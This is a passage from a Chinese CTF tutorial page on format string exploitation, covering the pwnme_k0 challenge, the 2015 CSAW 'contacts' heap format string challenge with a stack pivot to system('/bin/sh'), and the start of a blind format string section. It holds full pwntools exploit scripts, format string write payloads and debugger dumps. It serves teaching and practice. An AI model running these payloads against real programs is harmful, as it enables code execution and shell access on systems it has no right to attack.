+<p>0x0000000000400d74与0x00000000004008A6只有低2字节不同，所以我们可以只修改0x00007fffffffdb48开始的2个字节。</p>
+<h4 id="_21">利用程序<a class="headerlink" href="#_21" title="Permanent link">&para;</a></h4>
+<p>这里使用data[1:]的原因是当我们split的时候由于起始的是0x，所以会产生‘’字符串，需要跳过。</p>
+<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">pwnme</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwnme_k0&#39;</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
+    <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mi">11</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwnme_k0&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;%p&#39;</span> <span class="o">*</span> <span class="mi">9</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;1.&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">data</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
+<span class="n">rbp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">5</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">ret_addr</span> <span class="o">=</span> <span class="n">rbp</span> <span class="o">-</span> <span class="mh">0x38</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">))</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">%2214d</span><span class="s1">%8$hn&#39;</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+
+<h2 id="_22">堆上的格式化字符串漏洞<a class="headerlink" href="#_22" title="Permanent link">&para;</a></h2>
+<h3 id="_23">原理<a class="headerlink" href="#_23" title="Permanent link">&para;</a></h3>
+<p>所谓堆上的格式化字符串指的是格式化字符串本身存储在堆上，这个主要增加了我们获取对应偏移的难度，而一般来说，该格式化字符串都是很有可能被复制到栈上的。</p>
+<h3 id="_24">例子<a class="headerlink" href="#_24" title="Permanent link">&para;</a></h3>
+<p>这里我们以2015年CSAW中的contacts为例进行介绍。</p>
+<h4 id="_25">确定保护<a class="headerlink" href="#_25" title="Permanent link">&para;</a></h4>
+<div class="codehilite"><pre><span></span>➜  <span class="m">2015</span>-CSAW-contacts git:<span class="o">(</span>master<span class="o">)</span> ✗ checksec contacts
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
+</pre></div>
+
+<p>可以看出程序不仅开启了NX保护还开启了Canary。</p>
+<h4 id="_26">分析程序<a class="headerlink" href="#_26" title="Permanent link">&para;</a></h4>
+<p>简单看看程序，发现程序正如名字所描述的，是一个联系人相关的程序，可以实现创建，修改，删除，打印联系人的信息。而再仔细阅读，可以发现在输入联系人信息的时候存在格式化字符串漏洞。</p>
+<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">PrintInfo</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a3</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\t</span><span class="s">Name: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">a1</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\t</span><span class="s">Length %u</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">a2</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\t</span><span class="s">Phone #: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">a3</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\t</span><span class="s">Description: &quot;</span><span class="p">);</span>
+  <span class="k">return</span> <span class="n">printf</span><span class="p">(</span><span class="n">format</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+
+<p>仔细看看，可以发现这个format其实是指向堆中的。</p>
+<h4 id="_27">利用思路<a class="headerlink" href="#_27" title="Permanent link">&para;</a></h4>
+<p>我们的基本目的是获取系统的shell，从而拿到flag。其实既然有格式化字符串漏洞，我们应该是可以通过劫持got表或者控制程序返回地址来控制程序流程。但是这里却不怎么可行。原因分别如下</p>
+<ul>
+<li>之所以不能够劫持got来控制程序流程，是因为我们发现对于程序中常见的可以对于我们给定的字符串输出的只有printf函数，我们只有选择它才可以构造/bin/sh让它执行system('/bin/sh')，但是printf函数在其他地方也均有用到，这样做会使得程序直接崩溃。</li>
+<li>其次，不能够直接控制程序返回地址来控制程序流程的是因为我们并没有一块可以直接执行的地址来存储我们的内容，同时利用格式化字符串来往栈上直接写入system_addr+'bbbb'+addr of '/bin/sh‘似乎并不现实。</li>
+</ul>
+<p>那么我们可以怎么做呢？我们还有之前在栈溢出讲的技巧，stack privot。而这里，我们可以控制的恰好是堆内存，所以我们可以把栈迁移到堆上去。这里我们通过leave指令来进行栈迁移，所以在迁移之前我们需要修改程序保存ebp的值为我们想要的值。 只有这样在执行leave指令的时候，esp才会成为我们想要的值。同时，因为我们是使用格式化字符串来进行修改，所以我们得知道保存ebp的地址为多少，而这时PrintInfo函数中存储ebp的地址每次都在变化，而我们也无法通过其他方法得知。但是，<strong>程序中压入栈中的ebp值其实保存的是上一个函数的保存ebp值的地址</strong>，所以我们可以修改其<strong>上层函数的保存的ebp的值，即上上层函数（即main函数）的ebp数值</strong>。这样当上层程序返回时，即实现了将栈迁移到堆的操作。</p>
+<p>基本思路如下</p>
+<ul>
+<li>首先获取system函数的地址</li>
+<li>通过泄露某个libc函数的地址根据libc database确定。</li>
+<li>构造基本联系人描述为system_addr+'bbbb'+binsh_addr</li>
+<li>修改上层函数保存的ebp(即上上层函数的ebp)为<strong>存储system_addr的地址-4</strong>。</li>
+<li>当主程序返回时，会有如下操作</li>
+<li>move esp,ebp，将esp指向system_addr的地址-4</li>
+<li>pop ebp， 将esp指向system_addr</li>
+<li>ret，将eip指向system_addr，从而获取shell。</li>
+</ul>
+<h4 id="_28">获取相关地址与偏移<a class="headerlink" href="#_28" title="Permanent link">&para;</a></h4>
+<p>这里我们主要是获取system函数地址、/bin/sh地址，栈上存储联系人描述的地址，以及PrintInfo函数的地址。</p>
+<p>首先，我们根据栈上存储的libc_start_main_ret地址(该地址是当main函数执行返回时会运行的函数)来获取system函数地址、/bin/sh地址。我们构造相应的联系人，然后选择输出联系人信息，并将断点下在printf处，并且一直运行到格式化字符串漏洞的printf函数处，如下</p>
+<div class="codehilite"><pre><span></span> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;
+   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR <span class="o">[</span>esp<span class="o">]</span>
+      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret    
+      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR <span class="o">[</span>esp<span class="o">]</span>
+      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret    
+───────────────────────────────────────────────────────────────────────────────────────<span class="o">[</span> stack <span class="o">]</span>────
+<span class="o">[</span><span class="s1">&#39;0xffffccfc&#39;</span>, <span class="s1">&#39;l8&#39;</span><span class="o">]</span>
+<span class="m">8</span>
+0xffffccfc│+0x00: 0x08048c27  →   leave      ← <span class="nv">$esp</span>
+0xffffcd00│+0x04: 0x0804c420  →  <span class="s2">&quot;1234567&quot;</span>
+0xffffcd04│+0x08: 0x0804c410  →  <span class="s2">&quot;11111&quot;</span>
+0xffffcd08│+0x0c: 0xf7e5acab  →  &lt;puts+11&gt; add ebx, 0x152355
+0xffffcd0c│+0x10: 0x00000000
+0xffffcd10│+0x14: 0xf7fad000  →  0x001b1db0
+0xffffcd14│+0x18: 0xf7fad000  →  0x001b1db0
+0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000   ← <span class="nv">$ebp</span>
+──────────────────────────────────────────────────────────────────────────────────────────<span class="o">[</span> trace <span class="o">]</span>────
+<span class="o">[</span><span class="c1">#0] 0xf7e44670 → Name: __printf(format=0x804c420 &quot;1234567\n&quot;)</span>
+<span class="o">[</span><span class="c1">#1] 0x8048c27 → leave </span>
+<span class="o">[</span><span class="c1">#2] 0x8048c99 → add DWORD PTR [ebp-0xc], 0x1</span>
+<span class="o">[</span><span class="c1">#3] 0x80487a2 → jmp 0x80487b3</span>
+<span class="o">[</span><span class="c1">#4] 0xf7e13637 → Name: __libc_start_main(main=0x80486bd, argc=0x1, argv=0xffffce14, init=0x8048df0, fini=0x8048e60, rtld_fini=0xf7fe88a0 &lt;_dl_fini&gt;, stack_end=0xffffce0c)</span>
+<span class="o">[</span><span class="c1">#5] 0x80485e1 → hlt </span>
+────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  dereference <span class="nv">$esp</span> <span class="m">140</span>
+<span class="o">[</span><span class="s1">&#39;$esp&#39;</span>, <span class="s1">&#39;140&#39;</span><span class="o">]</span>
+<span class="m">1</span>
+0xffffccfc│+0x00: 0x08048c27  →   leave      ← <span class="nv">$esp</span>
+gef➤  dereference <span class="nv">$esp</span> l140
+<span class="o">[</span><span class="s1">&#39;$esp&#39;</span>, <span class="s1">&#39;l140&#39;</span><span class="o">]</span>
+<span class="m">140</span>
+0xffffccfc│+0x00: 0x08048c27  →   leave      ← <span class="nv">$esp</span>
+0xffffcd00│+0x04: 0x0804c420  →  <span class="s2">&quot;1234567&quot;</span>
+0xffffcd04│+0x08: 0x0804c410  →  <span class="s2">&quot;11111&quot;</span>
+0xffffcd08│+0x0c: 0xf7e5acab  →  &lt;puts+11&gt; add ebx, 0x152355
+0xffffcd0c│+0x10: 0x00000000
+0xffffcd10│+0x14: 0xf7fad000  →  0x001b1db0
+0xffffcd14│+0x18: 0xf7fad000  →  0x001b1db0
+0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000   ← <span class="nv">$ebp</span>
+0xffffcd1c│+0x20: 0x08048c99  →   add DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>, 0x1
+0xffffcd20│+0x24: 0x0804b0a8  →  <span class="s2">&quot;11111&quot;</span>
+0xffffcd24│+0x28: 0x00002b67 <span class="o">(</span><span class="s2">&quot;g+&quot;</span>?<span class="o">)</span>
+0xffffcd28│+0x2c: 0x0804c410  →  <span class="s2">&quot;11111&quot;</span>
+0xffffcd2c│+0x30: 0x0804c420  →  <span class="s2">&quot;1234567&quot;</span>
+0xffffcd30│+0x34: 0xf7fadd60  →  0xfbad2887
+0xffffcd34│+0x38: 0x08048ed6  →  0x25007325 <span class="o">(</span><span class="s2">&quot;%s&quot;</span>?<span class="o">)</span>
+0xffffcd38│+0x3c: 0x0804b0a0  →  0x0804c420  →  <span class="s2">&quot;1234567&quot;</span>
+0xffffcd3c│+0x40: 0x00000000
+0xffffcd40│+0x44: 0xf7fad000  →  0x001b1db0
+0xffffcd44│+0x48: 0x00000000
+0xffffcd48│+0x4c: 0xffffcd78  →  0x00000000
+0xffffcd4c│+0x50: 0x080487a2  →   jmp 0x80487b3
+0xffffcd50│+0x54: 0x0804b0a0  →  0x0804c420  →  <span class="s2">&quot;1234567&quot;</span>
+0xffffcd54│+0x58: 0xffffcd68  →  0x00000004
+0xffffcd58│+0x5c: 0x00000050 <span class="o">(</span><span class="s2">&quot;P&quot;</span>?<span class="o">)</span>
+0xffffcd5c│+0x60: 0x00000000
+0xffffcd60│+0x64: 0xf7fad3dc  →  0xf7fae1e0  →  0x00000000
+0xffffcd64│+0x68: 0x08048288  →  0x00000082
+0xffffcd68│+0x6c: 0x00000004
+0xffffcd6c│+0x70: 0x0000000a
+0xffffcd70│+0x74: 0xf7fad000  →  0x001b1db0
+0xffffcd74│+0x78: 0xf7fad000  →  0x001b1db0
+0xffffcd78│+0x7c: 0x00000000
+0xffffcd7c│+0x80: 0xf7e13637  →  &lt;__libc_start_main+247&gt; add esp, 0x10
+0xffffcd80│+0x84: 0x00000001
+0xffffcd84│+0x88: 0xffffce14  →  0xffffd00d  →  <span class="s2">&quot;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/201[...]&quot;</span>
+0xffffcd88│+0x8c: 0xffffce1c  →  0xffffd058  →  <span class="s2">&quot;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]&quot;</span>
+</pre></div>
+
+<p>我们可以通过简单的判断可以得到</p>
+<div class="codehilite"><pre><span></span>0xffffcd7c│+0x80: 0xf7e13637  →  &lt;__libc_start_main+247&gt; add esp, 0x10
+</pre></div>
+
+<p>存储的就是main相应的地址，同时利用fmtarg来获取对应的偏移，可以看出其偏移为32，那么相对于格式化字符串的偏移为31。</p>
+<div class="codehilite"><pre><span></span>gef➤  fmtarg 0xffffcd7c
+The index of format argument : <span class="m">32</span>
+</pre></div>
+
+<p>这样我们便可以得到对应的地址了。进而可以根据libc-database来获取对应的libc，继而获取system函数地址与/bin/sh函数地址了。</p>
+<p>其次，我们可以确定栈上存储格式化字符串的地址0xffffcd2c相对于格式化字符串的偏移为6，得到这个是为了构造我们的联系人。</p>
+<p>再者，我们可以看出下面的地址保存着上层函数的调用地址，其相对于格式化字符串的偏移为11，这样我们可以直接修改上层函数存储的ebp的值。</p>
+<div class="codehilite"><pre><span></span>0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000   ← <span class="nv">$ebp</span>
+</pre></div>
+
+<h4 id="_29">构造联系人获取堆地址<a class="headerlink" href="#_29" title="Permanent link">&para;</a></h4>
+<p>得知上面的信息后，我们可以利用下面的方式获取堆地址与相应的ebp地址。</p>
+<div class="codehilite"><pre><span></span>[system_addr][bbbb][binsh_addr][%6$p][%11$p][bbbb]
+</pre></div>
+
+<p>来获取对应的相应的地址。后面的bbbb是为了接受字符串方便。</p>
+<p>这里因为函数调用时所申请的栈空间与释放的空间是一致的，所以我们得到的ebp地址并不会因为我们再次调用而改变。</p>
+<h4 id="ebp">修改ebp<a class="headerlink" href="#ebp" title="Permanent link">&para;</a></h4>
+<p>由于我们需要执行move指令将ebp赋给esp，并还需要执行pop ebp才会执行ret指令，所以我们需要将ebp修改为存储system地址-4的值。这样pop ebp之后，esp恰好指向保存system的地址，这时在执行ret指令即可执行system函数。</p>
+<p>上面已经得知了我们希望修改的ebp值，而也知道了对应的偏移为11，所以我们可以构造如下的payload来进行修改相应的值。</p>
+<div class="codehilite"><pre><span></span>part1 = (heap_addr - 4) / 2
+part2 = heap_addr - 4 - part1
+payload = &#39;%&#39; + str(part1) + &#39;x%&#39; + str(part2) + &#39;x%6$n&#39;
+</pre></div>
+
+<h4 id="shell">获取shell<a class="headerlink" href="#shell" title="Permanent link">&para;</a></h4>
+<p>这时，执行完格式化字符串函数之后，退出到上上函数，我们输入5，退出程序即会执行ret指令，就可以获取shell。</p>
+<h4 id="_30">利用程序<a class="headerlink" href="#_30" title="Permanent link">&para;</a></h4>
+<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">contact</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./contacts&#39;</span><span class="p">)</span>
+<span class="c1">##context.log_level = &#39;debug&#39;</span>
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
+    <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mi">111</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./contacts&#39;</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">createcontact</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">phone</span><span class="p">,</span> <span class="n">descrip_len</span><span class="p">,</span> <span class="n">description</span><span class="p">):</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Contact info: </span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Name: &#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;You have 10 numbers</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">phone</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Length of description: &#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">descrip_len</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;description:</span><span class="se">\n\t\t</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">description</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">printcontact</span><span class="p">():</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Contacts:&#39;</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Description: &#39;</span><span class="p">)</span>
+
+
+<span class="c1">## get system addr &amp; binsh_addr</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;%31$paaaa&#39;</span>
+<span class="n">createcontact</span><span class="p">(</span><span class="s1">&#39;1111&#39;</span><span class="p">,</span> <span class="s1">&#39;1111&#39;</span><span class="p">,</span> <span class="s1">&#39;111&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">printcontact</span><span class="p">()</span>
+<span class="n">libc_start_main_ret</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;aaaa&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;get libc_start_main_ret addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_start_main_ret</span><span class="p">))</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;__libc_start_main_ret&#39;</span><span class="p">,</span> <span class="n">libc_start_main_ret</span><span class="p">)</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc_start_main_ret</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;__libc_start_main_ret&#39;</span><span class="p">)</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
+<span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;get system addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;get binsh addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">))</span>
+<span class="c1">##gdb.attach(sh)</span>
+
+<span class="c1">## get heap addr and ebp addr</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
+    <span class="n">system_addr</span><span class="p">,</span>
+    <span class="s1">&#39;bbbb&#39;</span><span class="p">,</span>
+    <span class="n">binsh_addr</span><span class="p">,</span>
+    <span class="s1">&#39;%6$p%11$pcccc&#39;</span><span class="p">,</span>
+<span class="p">])</span>
+<span class="n">createcontact</span><span class="p">(</span><span class="s1">&#39;2222&#39;</span><span class="p">,</span> <span class="s1">&#39;2222&#39;</span><span class="p">,</span> <span class="s1">&#39;222&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">printcontact</span><span class="p">()</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Description: &#39;</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;cccc&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">data</span>
+<span class="n">ebp_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">heap_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+
+<span class="c1">## modify ebp</span>
+<span class="n">part1</span> <span class="o">=</span> <span class="p">(</span><span class="n">heap_addr</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span>
+<span class="n">part2</span> <span class="o">=</span> <span class="n">heap_addr</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">-</span> <span class="n">part1</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;%&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">part1</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;x%&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">part2</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;x%6$n&#39;</span>
+<span class="c1">##print payload</span>
+<span class="n">createcontact</span><span class="p">(</span><span class="s1">&#39;3333&#39;</span><span class="p">,</span> <span class="s1">&#39;123456789&#39;</span><span class="p">,</span> <span class="s1">&#39;300&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">printcontact</span><span class="p">()</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Description: &#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Description: &#39;</span><span class="p">)</span>
+<span class="c1">##gdb.attach(sh)</span>
+<span class="k">print</span> <span class="s1">&#39;get shell&#39;</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
+<span class="c1">##get shell</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;5&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+
+<p>需要注意的是，这样并不能稳定得到shell，因为我们一次性输入了太长的字符串。但是我们又没有办法在前面控制所想要输入的地址。只能这样了。</p>
+<h2 id="_31">格式化字符串盲打<a class="headerlink" href="#_31" title="Permanent link">&para;</a></h2>
+<h3 id="_32">原理<a class="headerlink" href="#_32" title="Permanent link">&para;</a></h3>
+<p>所谓格式化字符串盲打指的是只给出可交互的ip地址与端口，不给出对应的binary文件来让我们进行pwn，其实这个和BROP差不多，不过BROP利用的是栈溢出，而这里我们利用的是格式化字符串漏洞。一般来说，我们按照如下步骤进行</p>
+<ul>
+<li>确定程序的位数</li>
+<li>确定漏洞位置 </li>
+<li>利用</li>
+</ul>
+<p>由于没找到比赛后给源码的题目，所以自己简单构造了两道题。</p>
+<h3 id="1-">例子1-泄露栈<a class="headerlink" href="#1-" title="Permanent link">&para;</a></h3>
+<p>源码和部署文件均放在了对应的文件夹fmt_blind_stack中。</p>
+<h4 id="_33">确定程序位数<a class="headerlink" href="#_33" title="Permanent link">&para;</a></h4>
+<p>我们随便输入了%p，程序回显如下信息</p>
+<div class="codehilite"><pre><span></span>➜  blind_fmt_stack git:<span class="o">(</span>master<span class="o">)</span> ✗ nc localhost <span class="m">9999</span>
+%p
+0x7ffd4799beb0
+G�flag is on the stack%                          
+</pre></div>
+
+<p>告诉我们flag在栈上，同时知道了该程序是64位的，而且应该有格式化字符串漏洞。</p>
